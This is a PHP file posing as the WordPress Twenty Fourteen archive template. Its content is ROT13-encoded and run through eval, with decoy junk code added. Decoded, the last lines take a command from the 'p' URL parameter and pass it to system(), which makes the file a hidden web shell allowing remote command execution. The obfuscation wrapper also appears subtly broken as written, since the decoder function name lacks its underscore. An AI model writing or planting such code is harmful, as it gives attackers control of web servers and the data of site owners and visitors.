<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gur grzcyngr sbe qvfcynlvat Nepuvir cntrf
 *
 * Hfrq gb qvfcynl nepuvir-glcr cntrf vs abguvat zber fcrpvsvp zngpurf n dhrel.
 * Sbe rknzcyr, chgf gbtrgure qngr-onfrq cntrf vs ab qngr.cuc svyr rkvfgf.
 *
 * Vs lbh'q yvxr gb shegure phfgbzvmr gurfr nepuvir ivrjf, lbh znl perngr n
 * arj grzcyngr svyr sbe rnpu fcrpvsvp bar. Sbe rknzcyr, Gjragl Sbhegrra
 * nyernql unf gnt.cuc sbe Gnt nepuvirf, pngrtbel.cuc sbe Pngrtbel nepuvirf,
 * naq nhgube.cuc sbe Nhgube nepuvirf.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/grzcyngr-uvrenepul/
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Sbhegrra
 * @fvapr Gjragl Sbhegrra 1.0
 */

trg_urnqre(); ?>

	<frpgvba vq=\"cevznel\" pynff=\"pbagrag-nern\">
		<qvi vq=\"pbagrag\" pynff=\"fvgr-pbagrag\" ebyr=\"znva\">

			<?cuc vs ( unir_cbfgf() ) : ?>

			<urnqre pynff=\"cntr-urnqre\">
				<u1 pynff=\"cntr-gvgyr\">
					<?cuc
					vs ( vf_qnl() ) {
						/* genafyngbef: %f: Qngr. */
						cevags( __( 'Qnvyl Nepuvirf: %f', 'gjraglsbhegrra' ), trg_gur_qngr() );
					} ryfrvs ( vf_zbagu() ) {
						/* genafyngbef: %f: Qngr. */
						cevags( __( 'Zbaguyl Nepuvirf: %f', 'gjraglsbhegrra' ), trg_gur_qngr( _k( 'S L', 'zbaguyl nepuvirf qngr sbezng', 'gjraglsbhegrra' ) ) );
					} ryfrvs ( vf_lrne() ) {
						/* genafyngbef: %f: Qngr. */
						cevags( __( 'Lrneyl Nepuvirf: %f', 'gjraglsbhegrra' ), trg_gur_qngr( _k( 'L', 'lrneyl nepuvirf qngr sbezng', 'gjraglsbhegrra' ) ) );
					} ryfr {
						_r( 'Nepuvirf', 'gjraglsbhegrra' );
					}
					?>
				</u1>
			</urnqre><!-- .cntr-urnqre -->

				<?cuc
				// Fgneg gur Ybbc.
				juvyr ( unir_cbfgf() ) :
					gur_cbfg();

					/*
					 * Vapyhqr gur cbfg sbezng-fcrpvsvp grzcyngr sbe gur pbagrag. Vs lbh jnag
					 * gb hfr guvf va n puvyq gurzr, gura vapyhqr n svyr pnyyrq pbagrag-___.cuc
					 * (jurer ___ vf gur cbfg sbezng) naq gung jvyy or hfrq vafgrnq.
					 */
					trg_grzcyngr_cneg( 'pbagrag', trg_cbfg_sbezng() );

					raqjuvyr;
					// Cerivbhf/arkg cntr anivtngvba.
					gjraglsbhegrra_cntvat_ani();

				ryfr :
					// Vs ab pbagrag, vapyhqr gur \"Ab cbfgf sbhaq\" grzcyngr.
					trg_grzcyngr_cneg( 'pbagrag', 'abar' );

				raqvs;
				?>
		</qvi><!-- #pbagrag -->
	</frpgvba><!-- #cevznel -->

<?cuc
trg_fvqrone( 'pbagrag' );
trg_fvqrone();
trg_sbbgre();

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>